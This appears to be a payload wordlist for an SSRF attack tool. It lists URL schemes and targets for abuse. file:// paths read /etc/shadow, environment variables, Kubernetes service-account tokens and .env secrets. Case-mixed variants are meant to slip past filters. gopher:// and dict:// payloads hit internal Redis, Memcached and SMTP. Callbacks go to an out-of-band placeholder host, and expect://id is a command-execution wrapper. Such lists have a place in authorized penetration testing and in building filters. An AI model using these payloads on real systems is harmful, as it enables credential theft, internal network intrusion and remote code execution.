# schemes.txt
# Alternative protocols / wrappers for SSRF (-mode ssrf).
# Danger: when SSRF fetches a full URL, these schemes allow file reads,
# hitting internal services (Redis/Memcached/FastCGI), even RCE.
# Placeholders: {{OOB}}, {{LHOST}}, {{TARGET}}
# Lines starting with # and blank lines are ignored.

# ---------- file:// (local read) ----------
file:///etc/passwd
file:///etc/hosts
file:///etc/shadow
file:///proc/self/environ
file:///proc/self/cmdline
file:///proc/self/cwd/
file:///proc/net/tcp
file:///proc/net/tcp6
file:///proc/net/udp
# network recon: find the internal subnet / live hosts without cloud metadata
file:///proc/net/arp
file:///proc/net/route
file:///proc/net/fib_trie
file:///etc/resolv.conf
file:///etc/network/interfaces
# container / k8s recon: confirm containerization, namespace, service identity
file:///proc/self/cgroup
file:///proc/1/cgroup
file:///proc/1/environ
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
# common app config / secrets (often hold internal service IPs + creds)
file:///.env
file:///app/.env
file:///var/www/.env
file:///var/www/html/.env
file:///c:/windows/win.ini
file://\/\/etc/passwd
file:/etc/passwd
# parser-differential: case-mixed and extra-slash scheme variants - a filter that
# blocks "file://" often misses these (seen on THM/real apps alike)
File:///etc/passwd
FILE:///etc/passwd
filE:///etc/passwd
file:////etc/passwd

# ---------- gopher:// (smuggling arbitrary TCP packets) ----------
# Redis example: run PING (craft the real payload URL-encoded in the field)
gopher://127.0.0.1:6379/_%0d%0aPING%0d%0a
gopher://127.0.0.1:6379/_PING
gopher://{{TARGET}}:6379/_INFO
gopher://127.0.0.1:11211/_stats
gopher://127.0.0.1:25/_HELO%20localhost
gopher://{{OOB}}:80/_GET

# ---------- dict:// (probing services, banners) ----------
dict://127.0.0.1:6379/INFO
dict://127.0.0.1:6379/stats
dict://127.0.0.1:11211/stats
dict://{{TARGET}}:22/
dict://127.0.0.1:3306/

# ---------- Other dangerous wrappers ----------
ftp://127.0.0.1/
ftp://{{OOB}}/
sftp://{{OOB}}/
tftp://{{OOB}}/
ldap://127.0.0.1:389/
ldap://{{TARGET}}:389/
jar:http://{{OOB}}!/
netdoc:///etc/passwd

# ---------- PHP wrappers (if SSRF reaches an include) ----------
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/read=string.rot13/resource=index.php
data://text/plain;base64,SSBsb3ZlIFBIUAo=
expect://id

# ---------- Protocol-relative / schemeless ----------
//{{OOB}}
//127.0.0.1
